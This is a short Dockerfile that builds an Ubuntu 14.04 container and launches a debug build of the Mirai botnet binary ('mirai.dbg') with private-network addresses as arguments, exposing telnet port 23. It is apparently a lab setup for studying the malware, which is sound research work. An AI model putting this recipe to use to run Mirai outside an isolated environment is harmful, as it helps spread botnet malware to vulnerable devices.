FROM ubuntu:14.04.5
ADD mirai.dbg /
CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` && /mirai.dbg 10.16.0.32 $IP 10.16.0.32 0
EXPOSE 23
